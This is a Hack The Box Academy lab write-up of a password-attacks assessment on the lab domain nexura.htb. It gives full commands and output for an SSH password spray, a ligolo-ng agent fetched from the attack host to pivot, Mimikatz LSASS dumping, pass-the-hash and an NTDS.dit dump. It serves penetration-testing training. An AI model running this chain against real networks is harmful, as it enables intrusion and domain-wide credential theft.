# Password Attacks — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** Password Attacks  
**Assessment:** Skills Assessment  
**Difficulty:** Medium  
**Domain:** nexura.htb  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Host | Technique | Outcome |
|------|------|-----------|---------|
| 1 | DMZ01 | username-anarchy + Hydra SSH spray | Foothold as `jbetty` |
| 2 | DMZ01 | bash_history credential hunting | Discovered `hwilliam` credentials |
| 3 | Attack Host | ligolo-ng pivot tunnel | Internal network 172.16.119.0/24 reachable |
| 4 | JUMP01 | nxc RDP spray | `hwilliam` valid on JUMP01, FILE01, DC01 |
| 5 | FILE01 | Snaffler share hunting | Located `Employee-Passwords_OLD.psafe3` |
| 6 | Attack Host | Hashcat mode 5200 | Cracked Password Safe 3 vault master password |
| 7 | FILE01 | Password Safe 3 vault | Recovered `bdavid` and `stom` credentials |
| 8 | JUMP01 | nxc WinRM spray | `bdavid` is local admin on JUMP01 |
| 9 | JUMP01 | Mimikatz `sekurlsa::logonpasswords` | Extracted `stom` NTLM hash from LSASS |
| 10 | DC01 | Pass-the-Hash via nxc SMB | `stom` is admin on DC01 |
| 11 | DC01 | nxc `--ntds` NTDS.dit dump | Extracted `NEXURA\Administrator` NT hash |

---

## Network Topology

```
[Attack Host: 10.10.14.209]
        ↓ SSH
[DMZ01: 10.129.234.116]  ← Linux pivot machine
        ↓ ligolo-ng tunnel (172.16.119.0/24)
        ├── JUMP01  (172.16.119.7)   — Windows 10/Server 2019, RDP/WinRM
        ├── FILE01  (172.16.119.10)  — Windows 10/Server 2019, SMB shares
        └── DC01    (172.16.119.11)  — Domain Controller, nexura.htb
```

---

## Question 1 — What is the NTLM hash of NEXURA\Administrator?

### Step 1 — Nmap Reconnaissance

```bash
Hackerpatel007_1@htb[/htb]$ nmap 10.129.234.116

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 08:41 CDT
Nmap scan report for 10.129.234.116
Host is up (0.0036s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Only SSH on port 22 is exposed. Given hints: potential password and name `Betty Jayde` but no username.

---

### Step 2 — Generate Username List with username-anarchy

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git && cd username-anarchy

Cloning into 'username-anarchy'...
remote: Enumerating objects: 448, done.
remote: Total 448 (delta 1), reused 1 (delta 1), pack-reused 386
Receiving objects: 100% (448/448), 16.79 MiB | 36.34 MiB/s, done.

Hackerpatel007_1@htb[/htb]$ ./username-anarchy Betty Jayde > user.list
```

username-anarchy generates statistically common username formats from a full name — `bjayde`, `jbetty`, `betty.jayde`, `b.jayde`, and so on.

---

### Step 3 — Hydra SSH Password Spray

```bash
Hackerpatel007_1@htb[/htb]$ hydra -L user.list -p 'HTB{flag_redacted}' ssh://10.129.234.116

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries
[22][ssh] host: 10.129.234.116   login: jbetty   password: HTB{flag_redacted}
1 of 1 target successfully completed, 1 valid password found
```

Valid credentials found: `jbetty` with the provided password.

---

### Step 4 — SSH Foothold on DMZ01

```bash
Hackerpatel007_1@htb[/htb]$ ssh jbetty@10.129.234.116

jbetty@DMZ01:~$
```

---

### Step 5 — Credential Hunting in bash_history

```bash
jbetty@DMZ01:~$ grep 'pass' -r /home/ 2>/dev/null

/home/jbetty/.bash_history:sshpass -p "HTB{flag_redacted}" ssh hwilliam@file01
/home/jbetty/.bash_history:passwd
```

Credentials for `hwilliam` discovered in bash history — the user previously SSHed to `file01` with a plaintext password passed via `sshpass`.

---

### Step 6 — Set Up ligolo-ng Pivot Tunnel

The internal network (`172.16.119.0/24`) is not directly reachable from the attack host. ligolo-ng is used to create a transparent tunnel through DMZ01.

**On attack host — download and extract ligolo-ng:**

```bash
Hackerpatel007_1@htb[/htb]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
Hackerpatel007_1@htb[/htb]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
Hackerpatel007_1@htb[/htb]$ tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
Hackerpatel007_1@htb[/htb]$ tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

**Serve the agent to DMZ01:**

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

**On DMZ01 — download the agent:**

```bash
jbetty@DMZ01:~$ wget http://10.10.14.209:8000/agent
agent    100%[===================>]   6.18M  35.2MB/s    in 0.2s
```

**Start the proxy on attack host:**

```bash
Hackerpatel007_1@htb[/htb]$ sudo ./proxy -selfcert

INFO[0000] Listening on 0.0.0.0:11601
ligolo-ng »
```

**Connect agent from DMZ01:**

```bash
jbetty@DMZ01:~$ chmod +x ./agent ; ./agent -connect 10.10.14.209:11601 --ignore-cert

WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established   addr="10.10.14.209:11601"
```

**On ligolo-ng proxy — select session and configure autoroute:**

```bash
ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.234.116:35974 - 00505694f5af

[Agent : jbetty@DMZ01] » autoroute
? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
INFO[0103] Using interface name desiredtank
INFO[0103] Creating routes for desiredtank...
? Start the tunnel? Yes
INFO[0124] Starting tunnel to jbetty@DMZ01
```

The internal network is now fully routable from the attack host through DMZ01.

---

### Step 7 — Validate hwilliam Credentials Across Internal Hosts

```bash
Hackerpatel007_1@htb[/htb]$ cat << EOF > hosts
172.16.119.13
172.16.119.7
172.16.119.10
172.16.119.11
EOF

Hackerpatel007_1@htb[/htb]$ nxc rdp hosts -u hwilliam -p 'HTB{flag_redacted}'

RDP  172.16.119.7   3389  JUMP01  [*] Windows 10 or Windows Server 2016 Build 17763 (domain:nexura.htb)
RDP  172.16.119.10  3389  FILE01  [*] Windows 10 or Windows Server 2016 Build 17763 (domain:nexura.htb)
RDP  172.16.119.11  3389  DC01    [*] Windows 10 or Windows Server 2016 Build 17763 (domain:nexura.htb)
RDP  172.16.119.7   3389  JUMP01  [+] nexura.htb\hwilliam:HTB{flag_redacted} (Pwn3d!)
RDP  172.16.119.10  3389  FILE01  [+] nexura.htb\hwilliam:HTB{flag_redacted}
RDP  172.16.119.11  3389  DC01    [+] nexura.htb\hwilliam:HTB{flag_redacted}
```

`hwilliam` authenticates to all three internal hosts. `Pwn3d!` on JUMP01 indicates local admin rights there.

---

### Step 8 — RDP to JUMP01 and Run Snaffler

```bash
Hackerpatel007_1@htb[/htb]$ wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe

Hackerpatel007_1@htb[/htb]$ xfreerdp /v:172.16.119.7 /u:hwilliam /p:'HTB{flag_redacted}' /dynamic-resolution /drive:linux,.
```

Share the current directory via RDP (`/drive:linux,.`), copy `Snaffler.exe` to the Desktop via File Explorer, then enumerate FILE01 shares:

```cmd
C:\Users\hwilliam\Desktop> .\Snaffler.exe -u -s -n FILE01.nexura.htb

[Share] {Green}<\\FILE01.nexura.htb\HR>(R)
[Share] {Green}<\\FILE01.nexura.htb\PRIVATE>(R)
[Share] {Green}<\\FILE01.nexura.htb\TRANSFER>(R)
[File] {Black}<KeepPassMgrsByExtension|R|^\.psafe3$|1.1kB>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3)
[File] {Green}<KeepNameContainsGreen|R|passw>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3)
[File] {Green}<KeepNameContainsGreen|R|passw>(\\FILE01.nexura.htb\PRIVATE\hwilliam\Online passwords.xlsx)
```

Snaffler flags `Employee-Passwords_OLD.psafe3` — a Password Safe 3 vault — as a high-value target.

---

### Step 9 — Download the Password Safe Vault via smbclient

```bash
Hackerpatel007_1@htb[/htb]$ smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR'

smb: \> cd Archive
smb: \Archive\> get Employee-Passwords_OLD.psafe3
getting file \Archive\Employee-Passwords_OLD.psafe3 of size 1080
```

---

### Step 10 — Identify Hashcat Mode for Password Safe 3

```bash
Hackerpatel007_1@htb[/htb]$ hashcat --example-hashes | grep -i safe -A 5

Name................: Password Safe v3
Category............: Password Manager
Hash.Mode...........: 5200
```

---

### Step 11 — Crack the Password Safe 3 Vault

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz

Employee-Passwords_OLD.psafe3:HTB{flag_redacted}

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Time.Started.....: Wed Jun 11 15:30:22 2025 (25 secs)
Recovered........: 1/1 (100.00%) Digests
```

---

### Step 12 — Open the Vault and Extract Credentials

Open Password Safe 3 on FILE01 (already installed), point it to `C:\Users\hwilliam\Desktop\Employee-Passwords_OLD.psafe3`, enter the cracked master password.

The vault contains two entries:

| Username | Password |
|----------|----------|
| `bdavid` | `HTB{flag_redacted}` |
| `stom` | `HTB{flag_redacted}` |

---

### Step 13 — Spray New Credentials — bdavid is Admin on JUMP01

```bash
Hackerpatel007_1@htb[/htb]$ nxc winrm hosts -u bdavid -p 'HTB{flag_redacted}'

WINRM  172.16.119.7   5985  JUMP01  [+] nexura.htb\bdavid:HTB{flag_redacted} (Pwn3d!)
WINRM  172.16.119.11  5985  DC01    [-] nexura.htb\bdavid:HTB{flag_redacted}
WINRM  172.16.119.10  5985  FILE01  [-] nexura.htb\bdavid:HTB{flag_redacted}

Hackerpatel007_1@htb[/htb]$ nxc rdp 172.16.119.7 -u bdavid -p 'HTB{flag_redacted}'

RDP  172.16.119.7  3389  JUMP01  [+] nexura.htb\bdavid:HTB{flag_redacted} (Pwn3d!)
```

`bdavid` is a local admin on JUMP01 with RDP access — ideal for LSASS dumping.

---

### Step 14 — RDP as bdavid and Dump LSASS with Mimikatz

```bash
Hackerpatel007_1@htb[/htb]$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

Hackerpatel007_1@htb[/htb]$ xfreerdp /v:172.16.119.7 /u:bdavid /p:'HTB{flag_redacted}' /dynamic-resolution /drive:linux,.
```

Copy `mimikatz.exe` from the `linux` RDP share to the Desktop, open an elevated command prompt, and run:

```cmd
C:\Windows\system32> C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 265194 (00000000:00040bea)
Session           : RemoteInteractive from 2
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : stom
         * Domain   : NEXURA
         * NTLM     : HTB{hash_redacted}
         * SHA1     : HTB{hash_redacted}
```

`stom`'s NTLM hash is extracted from LSASS memory — `stom` had an active session on JUMP01 from an earlier login.

---

### Step 15 — Pass-the-Hash as stom → Admin on DC01

```bash
Hackerpatel007_1@htb[/htb]$ nxc smb hosts -u stom -H HTB{hash_redacted}

SMB  172.16.119.10  445  FILE01  [+] nexura.htb\stom:HTB{hash_redacted} (Pwn3d!)
SMB  172.16.119.11  445  DC01    [+] nexura.htb\stom:HTB{hash_redacted} (Pwn3d!)
```

`stom` has admin access on both FILE01 and DC01 via Pass-the-Hash. DC01 admin means NTDS.dit is now within reach.

---

### Step 16 — Dump NTDS.dit for NEXURA\Administrator Hash

```bash
Hackerpatel007_1@htb[/htb]$ nxc smb 172.16.119.11 -u stom -H HTB{hash_redacted} --ntds --user Administrator

SMB  172.16.119.11  445  DC01  [+] nexura.htb\stom:HTB{hash_redacted} (Pwn3d!)
SMB  172.16.119.11  445  DC01  [+] Dumping the NTDS, this could take a while...
SMB  172.16.119.11  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:HTB{hash_redacted}:::
```

> **Answer:** `HTB{hash_redacted}`

---

## Flags

| Question | Answer |
|----------|--------|
| Q1 — NTLM hash of NEXURA\Administrator | `HTB{hash_redacted}` |

---

## Lessons Learned

- **username-anarchy** is an essential tool when a real name is known but no username is available — it generates all statistically common username formats in seconds, enabling targeted SSH/RDP spraying instead of blind brute forcing.
- **bash_history** is a goldmine on Linux pivot machines — credentials passed via `sshpass` or command-line flags are stored in plaintext and frequently overlooked by users.
- **ligolo-ng** provides a clean, low-noise tunnelling solution for accessing internal segments through a compromised DMZ host. The `autoroute` command handles interface creation and routing automatically.
- **Snaffler** dramatically accelerates share hunting in Active Directory environments — it automatically scores files by sensitivity and flags password manager databases, credential files, and configuration files in seconds.
- **Password Safe 3 vaults** (`.psafe3`) can be cracked offline with Hashcat mode `5200`. Corporate password databases stored on accessible file shares are extremely high-value targets.
- **LSASS memory** on a jump/bastion host will almost always contain hashes or credentials of other users who have recently logged in interactively — Mimikatz `sekurlsa::logonpasswords` should be a standard step after gaining local admin on any Windows machine.
- **Pass-the-Hash via nxc** is a rapid way to validate lateral movement potential across the entire network after extracting a hash — a single NTLM hash can unlock multiple hosts without knowing the plaintext password.
- **nxc `--ntds --user`** allows targeted extraction of a single account's hash from NTDS.dit rather than dumping the entire domain database — faster and quieter than a full dump.

---

## Full Attack Chain Reference

```
Nmap → SSH (port 22) only exposed on DMZ01
        ↓
username-anarchy (Betty Jayde) → user.list
        ↓
Hydra SSH spray → jbetty:HTB{flag_redacted}
        ↓
SSH foothold on DMZ01
        ↓
grep bash_history → hwilliam:HTB{flag_redacted} (sshpass command)
        ↓
ligolo-ng tunnel through DMZ01 → 172.16.119.0/24 reachable
        ↓
nxc RDP spray → hwilliam valid on JUMP01 (Pwn3d!), FILE01, DC01
        ↓
xfreerdp to JUMP01 as hwilliam + Snaffler against FILE01
        ↓
Employee-Passwords_OLD.psafe3 found in \\FILE01\HR\Archive\
        ↓
smbclient → download .psafe3 → hashcat -m 5200 → HTB{flag_redacted}
        ↓
Password Safe 3 vault → bdavid:HTB{flag_redacted}, stom:HTB{flag_redacted}
        ↓
nxc WinRM/RDP spray → bdavid is local admin on JUMP01 (Pwn3d!)
        ↓
xfreerdp to JUMP01 as bdavid → mimikatz sekurlsa::logonpasswords
        ↓
stom NTLM hash extracted from LSASS (active session on JUMP01)
        ↓
nxc SMB PtH → stom admin on FILE01 + DC01 (Pwn3d!)
        ↓
nxc --ntds --user Administrator → NEXURA\Administrator NT hash
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap <IP>` | Initial port scan |
| `./username-anarchy Betty Jayde > user.list` | Generate username candidates from full name |
| `hydra -L user.list -p '<pass>' ssh://<IP>` | SSH password spray with username list |
| `grep 'pass' -r /home/ 2>/dev/null` | Hunt credentials in home directories |
| `wget http://<IP>:8000/agent` | Transfer ligolo-ng agent to pivot host |
| `sudo ./proxy -selfcert` | Start ligolo-ng proxy on attack host |
| `./agent -connect <IP>:11601 --ignore-cert` | Connect ligolo-ng agent from pivot host |
| `autoroute` | Auto-configure tunnel routes in ligolo-ng |
| `nxc rdp hosts -u <user> -p '<pass>'` | Validate credentials via RDP across host list |
| `nxc smb hosts -u <user> -p '<pass>' --shares` | Enumerate SMB shares across hosts |
| `xfreerdp /v:<IP> /u:<user> /p:<pass> /dynamic-resolution /drive:linux,.` | RDP with shared local directory |
| `Snaffler.exe -u -s -n <host>` | Hunt credentials in shares on a specific host |
| `smbclient -U <domain>\\<user> '\\<IP>\<share>'` | Connect to SMB share |
| `hashcat --example-hashes \| grep -i safe -A 5` | Identify Hashcat mode for Password Safe |
| `hashcat -m 5200 <file>.psafe3 rockyou.txt` | Crack Password Safe 3 vault |
| `nxc winrm hosts -u <user> -p '<pass>'` | Validate WinRM admin access |
| `nxc rdp <IP> -u <user> -p '<pass>'` | Validate RDP admin access |
| `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit` | Dump credentials from LSASS |
| `nxc smb hosts -u <user> -H <NThash>` | Pass-the-Hash spray across hosts |
| `nxc smb <DC_IP> -u <user> -H <NThash> --ntds --user Administrator` | Dump Administrator hash from NTDS.dit |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1110 | T1110.001 | Brute Force: Password Guessing (Hydra SSH spray) |
| T1552 | T1552.003 | Unsecured Credentials: Bash History (`sshpass` credential in `.bash_history`) |
| T1090 | T1090.001 | Proxy: Internal Proxy (ligolo-ng tunnel through DMZ01) |
| T1021 | T1021.001 | Remote Services: Remote Desktop Protocol |
| T1021 | T1021.006 | Remote Services: Windows Remote Management (Evil-WinRM / nxc WinRM) |
| T1039 | — | Data from Network Shared Drive (Snaffler share hunting) |
| T1555 | T1555.005 | Credentials from Password Stores: Password Managers (Password Safe 3) |
| T1110 | T1110.002 | Brute Force: Password Cracking (Hashcat mode 5200) |
| T1003 | T1003.001 | OS Credential Dumping: LSASS Memory (Mimikatz `sekurlsa::logonpasswords`) |
| T1550 | T1550.002 | Use Alternate Authentication Material: Pass-the-Hash (nxc SMB PtH) |
| T1003 | T1003.003 | OS Credential Dumping: NTDS (nxc `--ntds` against DC01) |

---

*Part of the HTB Academy CPTS path — Password Attacks module.*  
*Penetration Tester role in India | Target: January 2027*
